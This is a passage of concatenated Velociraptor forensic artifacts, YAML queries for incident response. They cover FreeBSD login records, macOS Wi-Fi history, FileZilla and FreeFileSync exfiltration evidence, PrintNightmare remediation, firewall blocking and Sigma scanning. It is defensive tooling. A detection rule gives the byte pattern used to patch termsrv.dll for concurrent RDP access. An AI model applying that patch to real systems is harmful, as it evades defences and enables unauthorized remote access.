            params=dict(`extension_id`=ExtensionId,`version`=ExtensionVersion,`page`=1,`page_size`=100),
            method='GET')

        SELECT * FROM foreach(
             row=Response,
             query={
              SELECT
              name as Name,
              version as Version,
              vulnerability.severity AS VulnerabilitySeverity,
              component AS Component,
              detection AS Detection,
              extension_id AS ExtensionID,
              file_path AS FilePath,
              npmname AS NPMName,
              vuln_version AS VulnVersion,
              vulnerability.atOrAbove AS VulnerabilityAtOrAbove,
              vulnerability.below AS VulnerabilityBelow,
              vulnerability.identifiers AS VulnerabilityIdentifiers,
              vulnerability.info AS VulnerabilityInfo
               FROM foreach(row=Vulnerabilities)
             })

---END OF FILE---

======
FILE: /content/exchange/artifacts/GenericMonitor.yaml
======
name: Server.Alerts.GenericMonitor
description: |
   This is a template artifact to allow alerting on a monitoring artifact.
   
   Simply enter ArtifactName and modify VQL as desired.
   
   
type: SERVER_EVENT

parameters:
  - name: ArtifactName
    default: Windows.ETW.ETWSessions

sources:
  - query: |
        SELECT * from watch_monitoring(artifact=ArtifactName)

---END OF FILE---

======
FILE: /content/exchange/artifacts/FreeBSD.Sys.Utx.yaml
======
name: FreeBSD.Sys.Utx
author: Herbert Bärschneider
description: |
  Parse the utx file of the system (similar to wtmp on Linux). This covers user sessions, boots, shutdowns and system time changes.
  Because FreeBSD discards fields for the entries of the utx file based on type (see `man getutxent`), no direct parsing of the file using "vtypes" is done (too complicated for me to define a structure for parsing), but rather native tools are used for accessing the data.
  
  Using a value of "time" with the "userRegex" Parameter will give you all entries related to boots, shutdowns and system time changes.
  
  Beware: logout times are given in localtime! Furthermore, that column is not automatically parsed into timestamp values, because the tool output is not consistently a recognizable datetime.

type: CLIENT

parameters:
  - name: utxGlobs
    default: /var/log/utx.log*
    description: |
      glob for covering the files that should be parsed; default covers the usual location of the utx file on FreeBSD
  - name: userRegex
    type: regex
    default: "."
    description: |
      Regex for filtering the users, showing those you are interested in 
  - name: DateAfter
    type: timestamp
    description: |
      timestamp used for filtering the login time
  - name: DateBefore
    type: timestamp
    description: |
      timestamp used for filtering the login time

sources:
  - precondition:
      SELECT OS From info() where OS = 'freebsd'
    query: |
      -- timestamps given by the system command "last" are in local time, so we tell Velociraptor to handle them accordingly when converting with the VQL function "timestamp()"
      LET PARSE_TZ <= "local"
      
      -- time test function (taken from Windows.NTFS.MFT)
      LET time_test(stamp) =
            if(condition= DateBefore AND DateAfter,
                then= stamp < DateBefore AND stamp > DateAfter,
                else=
            if(condition=DateBefore,
                then= stamp < DateBefore,
                else=
            if(condition= DateAfter,
                then= stamp > DateAfter,
                else= True
            )))
      
      -- expand the glob and get all files that are matched by it
      LET Files = SELECT OSPath FROM glob(globs=split(string=utxGlobs, sep=","))
      
      -- for each targeted file, parse the data out of it using system built-in command 
      LET UtxParsing = SELECT * FROM foreach(row=Files,
      query={
        -- TODO: try the command while setting env variable "TZ" to UTC and check, if the timestamps are changed accordingly
        SELECT * 
        FROM execve(argv=["last", "-wy", "--libxo=json", "-f", OSPath])
        WHERE log(message="stderr: " + Stderr) 
      })
      
      -- parse the output from each file as json
      LET UtxContent = SELECT parse_json(data=Stdout) as Content FROM UtxParsing
      
      -- pull out the interesting information from the nested json content
      LET s = scope() -- a little helper to suppress "symbol not found error" for elements of the content that are sometimes missing
      LET FormatedContent = SELECT * FROM foreach(row=UtxContent,
      query={
        SELECT user, timestamp(string=`login-time`) AS login_time, s.`logout-time` AS logout_time, s.`session-length` AS session_length, s.tty AS tty, s.`from` AS remote, Content.`last-information`.utxdb AS utx_log FROM foreach(row=Content.`last-information`.last)
      })
      
      SELECT * FROM FormatedContent WHERE
        user =~ userRegex
        AND time_test(stamp=login_time)

---END OF FILE---

======
FILE: /content/exchange/artifacts/MacOS.Network.RecentWifiNetworks.yaml
======
name: MacOS.Network.RecentWifiNetworks

description: 
    This artifact looks for recent Wifi networks to which a host has joined. This can be useful in determining where a machine has been, or if a user has joined an illegitimate or unauthorized wireless network.
    
    *Tested on macOS Monterey

type: CLIENT

author: Wes Lambert - @therealwlambert

parameters:
  - name: RecentWifiNetworksGlob
    default: /Library/Logs/com.apple.wifi.recent-networks.json

precondition:
      SELECT OS From info() where OS = 'darwin'

sources:
  - query: |
      LET RecentNetworksLocation = SELECT OSPath from glob(globs=RecentWifiNetworksGlob)
      LET RecentNetworks = SELECT parse_json(data=read_file(filename=OSPath)) AS RN FROM RecentNetworksLocation
      LET EachNetwork = SELECT * from foreach(
            row=RecentNetworks,
            query={
               SELECT _key AS Network, _value AS Value
               FROM items(item=RN)
          }
      )
      SELECT Network AS Network,
            base64decode(string=Value.SSID) AS SSID,
             Value.AddReason AS AddReason,
             Value.AddedAt AS AddedAt,
             Value.UpdatedAt AS UpdatedAt,
             Value.JoinedByUserAt AS JoinedByUserAt,
             Value.JoinedBySystemAt AS JoinedBySystemAt,
             Value.SupportedSecurityTypes AS SupportedSecurityTypes,
             Value.Hidden AS Hidden,
             Value.SystemMode AS SystemMode,
             Value.CaptiveProfile.CaptiveNetwork AS CaptiveNetwork,
             Value.__OSSpecific__.ChannelHistory AS ChannelHistory,
             Value.__OSSpecific__.CollocatedGroup AS _CollocatedGroup,
             Value.PasspointSPRoamingEnabled AS _PasspointSPRoamingEnabled,
             Value AS _Data
      FROM EachNetwork

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.Applications.FreeFileSync.yaml
======
name: Windows.Applications.FreeFileSync
author: Nathanaël Ndong, Synacktiv
description: |
   This artefact can be used to retrieve and parse some FreeFileSync file in order to:
   - Identify the latest account used to transfer data and the remote ip adresse destination in the case of SFTP protocol with the qeury GlobalInfo
   - Identify the latest transfered files with Latest Data Transfer
   - Identify the presence of others interesting logs about previous or attempt of files transfer

   In the case of logs files, only the html version has been parsed
   
   These query were made in the context of the use of legitimate data transfer tools by an attacker.
   You can read more about it on https://www.synacktiv.com/publications/legitimate-exfiltration-tools-summary-and-detection-for-incident-response-and-threat

type: CLIENT

parameters:
   - name: FreeFileInfoGlob
     default: \AppData\Roaming\FreeFileSync\
     description: Use to retreive lastest global information including userID and remote destination for SFTP from GlobalSettings.xml file

   - name: userRegex
     default: .
     type: regex 
     
   - name: SearchFreeFileSyncLogs
     default: C:\Users\*\AppData\Roaming\FreeFileSync\Logs\*
     description:  Use a glob to define the files that will be searched

   - name: FreeFileSyncGlob
     default: C:\Users\*\AppData\Roaming\FreeFileSync\Logs\*Last*.html
     description: Use to retreive and parse lastest html log file
    
sources:
    - name: GlobalInfo
      query: |
        
        LET GlobalSettings_xml = SELECT * FROM foreach(
            row={
                SELECT Uid, Name As User,
                    expand (path=Directory) AS HomeDirectory
                FROM Artifact.Windows.Sys.Users()
                WHERE Name=~userRegex
            },
            query={
                SELECT User, OSPath,
                    parse_xml(file=OSPath).FreeFileSync.MainDialog.FilePanel.FolderHistoryRight AS Protocol,
                    parse_xml(file=OSPath).FreeFileSync.LastOnlineCheck AS Online,
                    Mtime
                FROM glob(globs=FreeFileInfoGlob + 'GlobalSettings.xml', root=HomeDirectory)
            })
        
        LET Value = SELECT * FROM foreach(
            row=GlobalSettings_xml,
            query={
                SELECT *, OSPath AS SourceFilePath
                FROM foreach(row=Protocol, query={
                    SELECT * FROM _value
                })
            })
        
        SELECT Item AS Last_Session_GlobalInfo FROM Value

    - name: Latest Data Transfer
      query: |
        LET InputLogPath = SELECT OSPath FROM glob(globs=FreeFileSyncGlob)
        
        LET extract_file(message)= parse_string_with_regex(string=message,
            regex=
                '''<.+?>(?P<Copy>.+?\s.+?)\s''' +
                '''&quot;'''+
                '''<*(?P<Provider>.+?)'''+
                ''':'''+
                '''[/\\]{1,2}'''+'''(?P<Connexion>.+?)[/\\]'''+
                '''(?P<Message>.+?)'''+
                '''&.*?</.+?>'''
        )
        
        LET last_date(message) = parse_string_with_regex(string=message,
            regex=
                '''(?P<Directory>.+?)''' +
                '''(?P<Date>\[.+?).html'''
        )
        
        LET parsed_line = SELECT * FROM foreach(row=InputLogPath,
            query={
                SELECT Line, FullPath FROM parse_lines(filename=InputLogPath.FullPath)
                WHERE Line =~ "Creating"
        })
                
        SELECT extract_file(message=Line).Copy AS Operation,
            extract_file(message=Line).Provider AS Protocol,
            extract_file(message=Line).Connexion AS Identifer, 
            extract_file(message=Line).Message AS File_Destination,
            last_date(message=FullPath).Date AS Last_Session_Date
        FROM parsed_line
        
        
    - name: FileUpload
      query: |
        LET logs_search = SELECT 
            OSPath,
            get(item=Data, field="mft") as Inode,
            Mode.String AS Mode,
            Size,
            Btime AS BTime,
            Mtime AS MTime,
            Ctime AS CTime,
            Atime AS ATime,
            IsDir, Data
        FROM glob(globs=SearchFreeFileSyncLogs)
      
        SELECT OSPath, Size,
            BTime, MTime, ATime,
            upload(file=OSPath) AS Upload
        FROM logs_search

column_types:
  - name: Modified
    type: timestamp
  - name: ATime
    type: timestamp
  - name: MTime
    type: timestamp
  - name: CTime
    type: timestamp
  - name: Upload
    type: preview_upload

---END OF FILE---

======
FILE: /content/exchange/artifacts/FileZilla.yaml
======
name: Windows.Forensics.FileZilla
description: |
   This artifact enumerate's all user directories on a system and will
   parse three files within a users AppData\Roaming\FileZilla
   directory: filezilla.xml, recentservers.xml, and queue.sqlite3
   
   The three files provide valuable data to incident responders if data was
   exfiltrated using FileZilla.
   
   - filezilla.xml - contains saved user settings
   - recentservers.xml - contains recently accessed servers
   - queue.sqlite3 - contains multiple tables that can be used to identify what
   files were exfiltrated and to where (remote hostname and file path).
   
   Using the sqlite() plugin, VR will parse user's queue.sqlite3 file and
   join data from various tables.
   
   You can read more about filezilla.xml and recentservers.xml forensic
   artifacts here: 
   https://www.hecfblog.com/2013/09/daily-blog-93-filezilla-artifacts.html
   
   The queue.sqlite3 does not have much documentation out there that I could
   find. However, it is a sqlite database that contains 5 tables: files,
   local_paths, remote_paths, servers, and sqlite_sequence that provide 
   valuable information to incident responders and shed light on what data
   was exfiltrated by a threat actor.
   
author: "Dan Kelly - @dan_kelly17"

# Can be CLIENT, CLIENT_EVENT, SERVER, SERVER_EVENT
type: CLIENT

parameters:
   - name: FileZillaGlob
     default: \AppData\Roaming\FileZilla\
     
   - name: queueSQLQuery
     default: |
        SELECT local_paths.path AS PATH, files.source_file AS File, servers.host FROM files JOIN local_paths ON local_paths.id = files.local_path JOIN servers ON servers.id = files.server
     
   - name: userRegex
     default: .
     type: regex

precondition: 
    SELECT OS FROM info() WHERE OS = 'windows'

sources:
  - name: FileZilla
    query: |
      -- get the filezilla.xml file
      LET filezilla_xml = SELECT * from foreach(
          row={
             SELECT Uid, Name AS User,
                    expand(path=Directory) AS HomeDirectory
             FROM Artifact.Windows.Sys.Users()
             WHERE Name =~ userRegex
          },
          query={
             SELECT 
                User, 
                OSPath, 
                parse_xml(file=OSPath).FileZilla3.Settings.Setting.Tabs.Tab as Tab,
                Mtime
             FROM glob(globs=FileZillaGlob + 'filezilla.xml', root=HomeDirectory)
          })
      
      SELECT * FROM foreach(row=filezilla_xml,
        query={
            SELECT 
                *, 
                OSPath AS SourceFilePath
                FROM foreach(row=Tab, query={
                    SELECT * FROM _value
                })
            })

  - name: RecentServers
    query: |
      LET recentservers_xml = SELECT * from foreach(
          row={
             SELECT Uid, Name AS User,
                    expand(path=Directory) AS HomeDirectory
             FROM Artifact.Windows.Sys.Users()
             WHERE Name =~ userRegex
          },
          query={
             SELECT 
                User, 
                OSPath, 
                parse_xml(file=OSPath).FileZilla3.RecentServers.Server as Server,
                Mtime
             FROM glob(globs=FileZillaGlob + 'recentservers.xml', root=HomeDirectory)
          })
          
      SELECT * FROM foreach(row=recentservers_xml,
        query={
            SELECT 
            *,
            OSPath AS SourceFilePath
            FROM foreach(row=Server, query={
                SELECT * FROM _value
            })
        })
        
  - name: Queue_SQLITE3
    query: |
      LET queue_sqlite = SELECT * from foreach(
          row={
             SELECT Uid, Name AS User,
                    expand(path=Directory) AS HomeDirectory
             FROM Artifact.Windows.Sys.Users()
             WHERE Name =~ userRegex
          },
          query={
             SELECT 
                User, 
                OSPath, 
                Mtime
             FROM glob(globs=FileZillaGlob + 'queue.sqlite3', root=HomeDirectory)
          })
      
      SELECT * FROM foreach(row=queue_sqlite,
        query={
            SELECT 
            *,
            OSPath as SourceFilePath
            FROM sqlite(file=OSPath, query=queueSQLQuery)
        })

---END OF FILE---

======
FILE: /content/exchange/artifacts/PrintSpoolerRemediation.yaml
======
name: Windows.Remediation.PrintSpooler
author: Matt Green - @mgreen27
description: |
   This artifact will enable mitigation of PrintSpooler exploitation
   used by PrintNightmare - CVE-2021-34527 and CVE-2021-1675.

   There are two selectable mitigations:

     - disabling the print spooler service.
     HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Spooler\Start = 4 (service disabled).

     - disable remote registration of the spool service.
     HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Printers\RegisterSpoolerRemoteRpcEndPoint = 2 (RegisterSpoolerRemoteRpcEndPoint disables).

   NOTE: ChangeServiceStartup will set to disable, not stop the
   printspool service.  Its always reccomended to use group policy to
   deploy these settings.


type: CLIENT

parameters:
 - name: TargetGlobs
   type: csv
   default: |
    Target,Description,Potential Values
    HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Spooler\Start,Print spooler service startup,"0 = Boot, 1 = System, 2 = Automatic, 3 = Manual, 4 = Disabled"
    HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Printers\RegisterSpoolerRemoteRpcEndPoint,Print spooler RemoteRpcEndPoint registration,"Enabled = 1, Disabled = 2"
    HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Policies\Microsoft\Windows NT\Printers\RegisterSpoolerRemoteRpcEndPoint,Print spooler RemoteRpcEndPoint registration WOW6432Node,"Enabled = 1, Disabled = 2"
 - name: MitigateServiceStartup
   type: bool
 - name: MitigateRegisterSpoolerRemoteRpcEndPoint
   type: bool

sources:
  - query: |
      -- remediation template
      LET execute_reg(key,name,value) = SELECT * FROM execve(argv=['reg','add',key,'/v',name,'/t','REG_DWORD','/d',value,'/f'])
      LET Arch = SELECT PROCESSOR_ARCHITECTURE FROM environ()

      LET remediation <= SELECT * FROM chain(
            a=if(condition=MitigateServiceStartup,
                then = execute_reg(key='HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Spooler',name='Start',value=4)),
            b= if(condition=MitigateRegisterSpoolerRemoteRpcEndPoint,
                then= execute_reg(key='HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Printers',name='RegisterSpoolerRemoteRpcEndPoint',value=2)),
            c= if(condition=MitigateRegisterSpoolerRemoteRpcEndPoint,
                then= if(condition= Arch.PROCESSOR_ARCHITECTURE[0]='AMD64',
                    then= execute_reg(key='HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Policies\\Microsoft\\Windows NT\\Printers',name='RegisterSpoolerRemoteRpcEndPoint',value=2)))
            )

      SELECT * FROM foreach(row=TargetGlobs,
        query={
            SELECT
                Description,
                `Potential Values`,
                mtime as ModifiedTime,FullPath,
                basename(path=FullPath) as KeyName,
                Data.type as KeyType,
                Data.value as KeyValue
            FROM glob(globs=Target, accessor="reg")
        })

---END OF FILE---

======
FILE: /content/exchange/artifacts/Termsrv.yaml
======
name: Windows.Detection.Termsrv
author: Matt Green - @mgreen27
description: |
    This artifact detects patched TerminalService / Remote Desktop (RDP) dynamic link library or ServiceDll - 
    termsrv.dll.
    
    ATT&CK T1505.005. Non Terminal Services Windows systems (e.g Windows 10 or 11) do not allow 
    concurrent users to RDP into the machine at the same time. Typically a notice 
    is displayed to the logged-on user requesting access and notifying of the 
    impending log off. As a defence evasion technique threat actors have been 
    known to patch termsrv.dll to evade detections.
    
    The artifact collects 3 potential detection points:
    
    1. In memory - targeting termsrv.dll mapped file for the patch bytes
    2. On disk - targeting and file named termsrv.dll
    3. Services - targeting any unutual ServiceDll path or an untrusted authenticode ServiceDll
    
reference:
  - https://attack.mitre.org/techniques/T1505/005/
  - https://www.mysysadmintips.com/windows/clients/545-multiple-rdp-remote-desktop-sessions-in-windows-10
  
type: CLIENT
  
parameters:
  - name: FileNameRegex
    description: Only file names that match this regular expression will be scanned.
    default: termsrv\.dll$
  - name: MappingRegex
    description: Only mapped sections that match this regular expression will be scanned.
    default: termsrv\.dll$
  - name: UploadHits
    type: bool
    description: If selected will upload any yara hits
  - name: YaraRule
    type: yara
    description: Patched RDP yara
    default: |
        rule termsrv_modified
        {
            meta:
                description = "Finds hex of termsrv.dll patch"
           strings:
                $patch = { B8 00 01 00 00 89 81 38 06 00 00 90 }
        
            condition:
                $patch
        }
  - name: ExpectedServiceDll
    description: Expected service dll location regex
    default: '''^C:\\Windows\\System32\\termsrv\.dll$'''
    
precondition: SELECT OS From info() where OS = 'windows'

sources:
  - name: VAD
    query: |
        SELECT ProcessCreateTime,Pid,Name,MappingName,AddressRange,State,Type,
            ProtectionMsg,Protection,SectionSize,YaraHit,HitContext,ProcessChain
        FROM Artifact.Windows.System.VAD(
                ProcessRegex='svchost\.exe',
                MappingNameRegex=MappingRegex,
                SuspiciousContent=YaraRule,
                UploadSection=UploadHits )

  - name: Yara.NTFS
    query: |
        SELECT OSPath,Size,ModTime,Rule,Meta,YaraString,HitOffset,HitContext
        FROM Artifact.Windows.Detection.Yara.NTFS(
                FileNameRegex=FileNameRegex,
                PathRegex=".",
                YaraRule=YaraRule,
                UploadHits=UploadHits,
                NumberOfHits=1 )
                
  - name: Services
    query: |
        SELECT State,Name,DisplayName,Status,Pid,ExitCode,StartMode,PathName,
            ServiceType,UserAccount,Created,FailureCommand,FailureActions,
            AbsoluteExePath, ServiceDll,
            HashServiceDll, CertinfoServiceDll,
            parse_pe(file=ServiceDll) as PEInfo
        FROM Artifact.Windows.System.Services(
                            DisplayNameRegex='Remote Desktop Services',
                            Calculate_hashes='Y',
                            CertificateInfo='Y')
        WHERE Name =~ 'TermService'
            AND ( NOT ServiceDll =~ ExpectedServiceDll OR CertinfoServiceDll.Trusted = 'untrusted' )
            
column_types:
  - name: HitContext
    type: preview_upload

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.Generic.Internet.BlockAccess.yaml
======
name: Windows.Generic.Internet.BlockAccess
description: |
      Simply adds a new inbound or outbound firewall rule that filters traffic by allowing or blocking network packets that match the specified criteria via `netsh advfirewall add rule` command. Applicable in case of blocking Internet access.
      
      HOW it does:
      
      - Use a configurable lookup table to generate additional entries.
        - Using `nslookup` command first to get IP from specific domain
      - An optional `MessageBox` may also be configured to alert all logged in users.
        - The message will be truncated to 256 characters.
      - After advfirewall rules application, connection back to the Velociraptor
      frontend is tested and the rule removed if connection unavailable.
      - To remove rule, select the `RemoveRule` checkbox.
      - To update rule, simply rerun the artifact.
      
      WHY advfirewall?
      
      - The `netsh ipsec` and `netsh firewall` contexts are provided for backwards-compatibility with Windows 2000/XP/2003 (Now they are all **EOL**). 
      - `Netsh AdvFirewall` applies to: Windows 7, Windows Server 2008, Windows Server 2008 R2, Windows Vista.
      - If you are new to advfirewall, please check reference link from MS first for more information.
      
      NOTE: Test carefully before running at scale in production environment
      
      Inspired by `Windows.Remediation.Quarantine` from Matt Green - @mgreen27 (use netsh IPsec)

author: TueDenn - @tuedenn

reference:
  - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-r2-and-2008/dd734783(v=ws.10)
  - https://serverfault.com/questions/851922/blocking-ip-address-with-netsh-filter
  - https://docs.velociraptor.app/artifact_references/pages/windows.remediation.quarantine/

required_permissions:
  - EXECVE

precondition: SELECT OS From info() where OS = 'windows'

parameters:
  - name: RuleName
    default: "VeloBlockAccess"
  - name: RuleLookupTable
    type: csv
    default: |
        dir,remoteip,protocol,interface,action,enable,description
        out,13.107.237.39,any,any,block,yes,block openai.com 1
        out,13.107.238.39,any,any,block,yes,block openai.com 2
        out,157.240.199.35,any,any,block,yes,block facbook.com
  - name: MessageBox
    description: |
        Optional message box notification to send to logged in users. 256
        character limit.
  - name: RemoveRule
    type: bool
    description: Tickbox to remove advfirewall rule.

sources:
    - query: |

        // If a MessageBox configured truncate to 256 character limit
        LET MessageBox <= parse_string_with_regex(
                  regex='^(?P<Message>.{0,255}).*',
                  string=MessageBox).Message

        // extract configurable policy from lookuptable
        LET configurable_rule <= SELECT
                  dir,remoteip,protocol,interface,action,enable,description
              FROM RuleLookupTable
        
        // Emit the message if no output is emitted, otherwise emit the output.
        LET combine_results(Stdout, Stderr, ReturnCode, Message) = if(
              condition=Stdout =~ "[^\\s]", then=Stdout,
              else= if(condition=Stderr =~ "[^\\s]", then=Stderr,
              else= if(condition= ReturnCode=0,
                    then=Message )))

        // Removes empty options from the command line
        LET clean_cmdline(CMD) = filter(list=CMD, regex='^(\\w+|\\w+=.+)$')

        LET delete_cmdline = clean_cmdline(
             CMD=('netsh','advfirewall','firewall','delete','rule', 'name=' + RuleName))

        LET entry_cmdline(RuleName, dir,interface,action,remoteip,protocol,enable) = clean_cmdline(
             CMD=('netsh','advfirewall','firewall','add','rule',
               format(format='name=%s', args=RuleName),
               format(format='dir=%s', args=dir),
               format(format='interface=%s', args=interface),
               format(format='action=%s', args=action),
               format(format='remoteip=%s', args=remoteip),
               format(format='protocol=%s', args=protocol),
               format(format='enable=%s', args=enable)))
        
        
        // delete old or unwanted policy
        LET delete_rule = SELECT
              timestamp(epoch=now()) as Time,
              RuleName + ' firewall rule deleted.' AS Result
          FROM execve(argv=delete_cmdline, length=10000)

        // loop over configurable_rule to create advfirewall rule
        LET create_rule = SELECT * FROM foreach(
            row=configurable_rule,
            query= {
                  SELECT
                      timestamp(epoch=now()) as Time,
                      combine_results(Stdout=Stdout, Stderr=Stderr,
                          ReturnCode=ReturnCode,
                          Message='Rule added: ' +
                                 join(array=entry_cmdline(RuleName=RuleName, 
                                                dir=dir,
                                                interface=interface,
                                                action=action,
                                                remoteip=remoteip,
                                                protocol=protocol,
                                                enable=enable), sep=" ")) AS Result
                  FROM execve(argv=entry_cmdline(RuleName=RuleName, 
                                                dir=dir,
                                                interface=interface,
                                                action=action,
                                                remoteip=remoteip,
                                                protocol=protocol,
                                                enable=enable), length=10000)
            })
        
        // Parse a URL to get domain name.
        LET get_domain(URL) = parse_string_with_regex(
             string=URL, regex='^https?://(?P<Domain>[^:/]+)').Domain

        // Parse a URL to get the port
        LET get_port(URL) = if(condition= URL=~"https://[^:]+/", then="443",
              else=if(condition= URL=~"http://[^:]+/", then="80",
              else=parse_string_with_regex(string=URL,
                  regex='^https?://[^:/]+(:(?P<Port>[0-9]*))?/').Port))

        // extract Velociraptor config to get domain and port information
        LET extracted_config <= SELECT * FROM foreach(
                  row=config.server_urls,
                  query={
                      SELECT
                          get_domain(URL=_value) AS DstAddr,
                          get_port(URL=_value) AS DstPort,
                          'VelociraptorFrontEnd' AS Description,
                          _value AS URL
                      FROM scope()
                  })
        
        // Check connection to Velociraptor frontend server
        LET test_connection = SELECT * FROM foreach(
                  row={
                      SELECT * FROM extracted_config
                      WHERE Description = 'VelociraptorFrontEnd'
                  },
                  query={
                      SELECT *
                          Url,
                          response
                      FROM
                          http_client(url='https://' + DstAddr + ':' + DstPort + '/server.pem',
                              disable_ssl_security='TRUE')
                      WHERE Response = 200
                      LIMIT 1
                  })
        
        // final check to keep or remove policy
        LET final_check = SELECT * FROM if(condition= test_connection,
                  then={
                      SELECT
                          timestamp(epoch=now()) as Time,
                          if(condition=MessageBox,
                              then= RuleName + ' connection test successful. MessageBox sent.',
                              else= RuleName + ' connection test successful.'
                              ) AS Result
                      FROM if(condition=MessageBox,
                          then= {
                              SELECT * FROM execve(argv=['msg','*',MessageBox])
                          },
                          else={
                              SELECT * FROM scope()
                          })
                  },
                  else={
                      SELECT
                          timestamp(epoch=now()) as Time,
                          RuleName + ' failed connection test. Removing advfirewall rule.' AS Result
                      FROM delete_rule
                  })

        // Execute content
        SELECT * FROM if(condition=RemoveRule,
                  then=delete_rule,
                  else={
                      SELECT * FROM chain(
                          a=delete_rule,
                          b=create_rule,
                          c=final_check)
                  })

---END OF FILE---

======
FILE: /content/exchange/artifacts/MacOS.Logs.MacMonitor.yaml
======
name: MacOS.Logs.MacMonitor
description: |
   This artifact parses JSONL-formatted logs generated by MacMonitor.
reference:
   - https://github.com/redcanaryco/mac-monitor 
parameters:
   - name: JSONLGlob
     default:
   - name: ProcessRegex
     description: "Filter on process name"
     default: .
     type: regex
   - name: InitiatingProcessRegex
     description: "Filter on initiating process name"
     default: .
     type: regex

sources:
    - query: |
        LET MacMonitorLogs <= SELECT FullPath FROM glob(globs=JSONLGlob)
        SELECT 
          activity_at_ts AS Timestamp,
          substr(start=14, str=es_event_type) AS EventType,
          target AS ProcessName,
          initiating_process_path AS InitiatingProcessPath,
          initiating_process_name AS InitiatingProcessName,
          initiating_pid AS InitiatingPID,
          initiating_process_signing_id AS InitiatingProcessSigningID,
          initiating_ruid_human AS InitiatingUser,
          initiating_euid_human AS InitiatingEffectiveUser,
          initiating_ruid AS InitiatingUserId,
          initiating_ruid AS InitiatingEffectiveUserId,
          initiating_process_group_id AS InitiatingProcessGID,
          initiating_process_file_quarantine_type AS InitiatingProcessQuarantineType,
          initiating_process_cdhash AS InitiatingProcessCDHash,
          audit_token AS AuditToken,
          responsible_audit_token AS ResponseAuditToken,
          parent_audit_token AS ParentAuditToken,
          macOS AS OSVersion,
          sensor_id AS SensorId,
          path_is_truncated AS PathIsTruncated//,
          //fork_event AS ForkEvent
        FROM parse_jsonl(accessor="file", filename=MacMonitorLogs.FullPath)
        WHERE ProcessName =~ ProcessRegex AND 
        InitiatingProcessName =~ InitiatingProcessRegex

---END OF FILE---

======
FILE: /content/exchange/artifacts/Exchange.Label.User.yaml
======
name: Exchange.Label.User
description: |
   This artifact watches for new client enrollments and automatically
   label the client with the required label if the user exists.

   This artifact can be the starting point for automatically labeling
   a machine based on any other property - just change the artifact to
   watch and the result filter.

   #server #event #labels

type: SERVER_EVENT

parameters:
  - name: Label
    default: MikesBox
  - name: NameRegex
    default: mike

sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'

    query: |
        LET user_flows = SELECT *
        FROM watch_monitoring(artifact="System.Flow.Completion")
        WHERE Flow.artifacts_with_results =~ "Generic.Client.Info/Users"

        LET results = SELECT *,
           label(client_id=ClientId, labels=Label, op="set")
           FROM source(artifact="Generic.Client.Info/Users" ,
                       client_id=ClientId, flow_id=FlowId)
           WHERE Name =~ NameRegex

        SELECT * FROM foreach(row=user_flows, query=results)

---END OF FILE---

======
FILE: /content/exchange/artifacts/PrinterDriver.yaml
======
name: Windows.System.PrinterDriver
author: Matt Green - @mgreen27
description: |
   This artifact will enumerate installed PrintDrivers using the
   Win32_PrinterDriver wmi class and parse each DriverPath, ConfigFile
   and DataFile.

   Hunt by searching for untrusted binaries or suspicious removed
   binararies for evidence of previous exploitation.

type: CLIENT

sources:
  - query: |
      LET Win32_PrinterDrivers = SELECT
            split(string=Name, sep=',')[0] as Name,
            SupportedPlatform,
            Version,
            DriverPath,
            ConfigFile,
            DataFile
          FROM wmi(query='SELECT * FROM Win32_PrinterDriver',namespace='root/CIMV2')

      SELECT * FROM Win32_PrinterDrivers

  - name: BinaryCheck
    query: |
      SELECT
            lowcase(string=Binary) as Binary,
            array(a1={
                SELECT Name FROM Win32_PrinterDrivers
                WHERE ( DriverPath = Binary OR ConfigFile = Binary OR DataFile = Binary )
            }) as DriverNames,
            hash(path=Binary) as Hash,
            parse_pe(file=Binary) as PE,
            authenticode(filename=Binary) as Authenticode
      FROM chain(
            a={
                SELECT Name, DriverPath as Binary, 'DriverPath' as Type
                FROM Win32_PrinterDrivers
            },
            b={
                SELECT Name as DriverName, ConfigFile as Binary, 'ConfigFile' as Type
                FROM Win32_PrinterDrivers
            },
            c={
                SELECT Name as DriverName, DataFile as Binary, 'DataFile' as Type
                FROM Win32_PrinterDrivers
            })
      GROUP BY lowcase(string=Binary)

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.EventLogs.Zircolite.yaml
======
name: Windows.EventLogs.Zircolite
description: |
    Zircolite is a standalone tool that can be used to apply Sigma rules to EVTX files on endpoints in an effort to quickly parse large datasets and surface detections.
                
    You can read more about Zircolite below:
        
    https://github.com/wagga40/Zircolite
        
    NOTE: This artifact may take several minutes to run, depending on the size of EVTX files being analyzed.
    
author: Wes Lambert -- @therealwlambert
tools:
  - name: Zircolite
    url: https://github.com/wagga40/Zircolite/releases/download/2.8.1/zircolite_win10.exe
parameters:
  - name: EVTXPath
    default: 'C:\Windows\System32\winevt\Logs'
  - name: Rules
    type: upload
    description: Ruleset to be used (defaults to Zircolite generic ruleset)
    default: https://raw.githubusercontent.com/wagga40/Zircolite/master/rules/rules_windows_generic.json
  - name: Mappings
    type: upload
    default: https://raw.githubusercontent.com/wagga40/Zircolite/master/config/fieldMappings.json
    description: Mappings for ruleset (defaults to Zircolite field mappings)
    
sources:
  - query: |
        LET TmpResults <= tempfile(remove_last=True)
        LET Results =  SELECT * FROM read_file(filenames=TmpResults)
        LET Zlite <= SELECT FullPath FROM Artifact.Generic.Utils.FetchBinary(ToolName="Zircolite", IsExecutable=FALSE)
        LET RulesFile <= tempfile(data=Rules, remove_last=True, extension=".json")
        Let MappingsFile <= tempfile(data=Mappings, remove_last=True, extension=".json")
        LET ExecZlite <= SELECT * FROM execve(argv=[
                        Zlite.FullPath[0], 
                        "--evtx", EVTXPath, 
                        "--ruleset", RulesFile,
                        "--config", MappingsFile,
                        "--noexternal",
                        "--outfile", TmpResults])
        LET Data = SELECT * FROM foreach(row=Results, query={SELECT parse_json_array(data=Data) AS Content FROM scope()})
        SELECT * FROM foreach(row=Data, query={
            SELECT
                get(member="title") AS Detection,
